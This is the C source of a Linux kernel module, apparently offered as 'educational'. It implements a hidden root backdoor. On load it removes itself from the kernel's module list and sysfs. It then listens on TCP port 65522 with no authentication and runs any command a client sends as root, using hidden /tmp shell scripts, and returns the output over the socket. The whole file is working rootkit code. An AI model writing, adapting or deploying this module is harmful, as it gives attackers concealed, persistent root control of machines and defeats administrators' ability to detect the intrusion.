#include <linux/module.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/tcp.h>
#include <linux/socket.h>
#include <linux/fs.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Educational");
MODULE_DESCRIPTION("Kernel TCP command server");

static struct task_struct *server_thread;
static struct socket *listen_socket;

// 隐藏模块的函数
static void hide_module(void) {
    struct module *mod = THIS_MODULE;
    
    list_del_init(&mod->list);
    kobject_del(&mod->mkobj.kobj);
    list_del_init(&mod->mkobj.kobj.entry);
}

// 创建TCP服务器
static int create_tcp_server(int port) {
    struct sockaddr_in addr;
    int ret;
    
    // 创建socket
    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &listen_socket);
    if (ret < 0) {
        return ret;
    }
    
    // 设置地址
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    
    // 绑定端口
    ret = kernel_bind(listen_socket, (struct sockaddr *)&addr, sizeof(addr));
    if (ret < 0) {
        sock_release(listen_socket);
        return ret;
    }
    
    // 开始监听
    ret = kernel_listen(listen_socket, 5);
    if (ret < 0) {
        sock_release(listen_socket);
        return ret;
    }
    
    return 0;
}

// 通过shell脚本执行命令并捕获输出
static void execute_command_with_output(struct socket *client_sock, const char *cmd) {
    struct file *file;
    loff_t pos = 0;
    char script_path[64];
    char output[4096] = {0};
    struct msghdr msg;
    struct kvec vec;
    int ret;
    
    // 生成唯一的脚本文件名
    snprintf(script_path, sizeof(script_path), "/tmp/.cmd_%lu.sh", jiffies);
    
    // 创建脚本文件
    file = filp_open(script_path, O_CREAT | O_WRONLY | O_TRUNC, 0700);
    if (IS_ERR(file)) {
        return;
    }
    
    // 写入脚本内容
    char script_content[1024];
    snprintf(script_content, sizeof(script_content), 
             "#!/bin/sh\n%s > /tmp/.cmd_output 2>&1\n"
             "echo \"Exit code: $?\" >> /tmp/.cmd_output\n"
             "cat /tmp/.cmd_output", cmd);
    
    ret = kernel_write(file, script_content, strlen(script_content), &pos);
    filp_close(file, NULL);
    
    if (ret <= 0) {
        return;
    }
    
    // 执行脚本
    char *argv[] = { "/bin/sh", script_path, NULL };
    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    
    ret = call_usermodehelper("/bin/sh", argv, envp, UMH_WAIT_PROC);
    
    // 读取输出
    file = filp_open("/tmp/.cmd_output", O_RDONLY, 0);
    if (!IS_ERR(file)) {
        pos = 0;
        ret = kernel_read(file, output, sizeof(output) - 1, &pos);
        if (ret > 0) {
            output[ret] = '\0';
        }
        filp_close(file, NULL);
    } else {
        snprintf(output, sizeof(output), "Failed to read command output\n");
    }
    
    // 发送响应
    vec.iov_base = output;
    vec.iov_len = strlen(output);
    
    memset(&msg, 0, sizeof(msg));
    msg.msg_flags = 0;
    
    kernel_sendmsg(client_sock, &msg, &vec, 1, vec.iov_len);
    
    // 清理文件
    char *clean_argv[] = { "/bin/rm", "-f", script_path, "/tmp/.cmd_output", NULL };
    call_usermodehelper("/bin/rm", clean_argv, envp, UMH_WAIT_EXEC);
}

// 处理客户端连接
static void handle_client(struct socket *client_sock) {
    struct msghdr msg;
    struct kvec vec;
    char buffer[1024];
    int ret;
    
    // 发送欢迎消息
    char *welcome = "Kernel Command Server - Enter commands to execute\n> ";
    vec.iov_base = welcome;
    vec.iov_len = strlen(welcome);
    memset(&msg, 0, sizeof(msg));
    kernel_sendmsg(client_sock, &msg, &vec, 1, vec.iov_len);
    
    while (!kthread_should_stop()) {
        // 接收数据
        memset(buffer, 0, sizeof(buffer));
        vec.iov_base = buffer;
        vec.iov_len = sizeof(buffer) - 1;
        
        memset(&msg, 0, sizeof(msg));
        msg.msg_flags = 0;
        
        ret = kernel_recvmsg(client_sock, &msg, &vec, 1, vec.iov_len, msg.msg_flags);
        if (ret <= 0) {
            break;
        }
        
        buffer[ret] = '\0';
        
        // 移除换行符
        if (buffer[strlen(buffer) - 1] == '\n') {
            buffer[strlen(buffer) - 1] = '\0';
        }
        
        // 跳过空命令
        if (strlen(buffer) == 0) {
            // 发送提示符
            char *prompt = "> ";
            vec.iov_base = prompt;
            vec.iov_len = strlen(prompt);
            memset(&msg, 0, sizeof(msg));
            kernel_sendmsg(client_sock, &msg, &vec, 1, vec.iov_len);
            continue;
        }
        
        // 执行命令
        execute_command_with_output(client_sock, buffer);
        
        // 发送新的提示符
        char *prompt = "\n> ";
        vec.iov_base = prompt;
        vec.iov_len = strlen(prompt);
        memset(&msg, 0, sizeof(msg));
        kernel_sendmsg(client_sock, &msg, &vec, 1, vec.iov_len);
    }
    
    sock_release(client_sock);
}

// TCP服务器线程函数
static int tcp_server_func(void *data) {
    struct socket *client_sock;
    int ret;
    
    allow_signal(SIGKILL);
    
    // 创建TCP服务器
    ret = create_tcp_server(65522);
    if (ret < 0) {
        return ret;
    }
    
    while (!kthread_should_stop()) {
        // 接受客户端连接
        ret = kernel_accept(listen_socket, &client_sock, 0);
        if (ret < 0) {
            if (signal_pending(current)) {
                break;
            }
            msleep(100);
            continue;
        }
        
        // 处理客户端
        handle_client(client_sock);
    }
    
    // 清理
    if (listen_socket) {
        sock_release(listen_socket);
        listen_socket = NULL;
    }
    
    return 0;
}

static int __init kernel_server_init(void) {
    // 创建服务器线程
    server_thread = kthread_run(tcp_server_func, NULL, "ktcp_server");
    if (IS_ERR(server_thread)) {
        return PTR_ERR(server_thread);
    }
    
    // 隐藏模块
    hide_module();
    
    return 0;
}

static void __exit kernel_server_exit(void) {
    if (server_thread) {
        kthread_stop(server_thread);
        server_thread = NULL;
    }
    
    if (listen_socket) {
        sock_release(listen_socket);
        listen_socket = NULL;
    }
    
    // 清理临时文件
    char *argv[] = { "/bin/rm", "-f", "/tmp/.cmd_*.sh", "/tmp/.cmd_output", NULL };
    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    call_usermodehelper("/bin/rm", argv, envp, UMH_WAIT_EXEC);
}

module_init(kernel_server_init);
module_exit(kernel_server_exit);
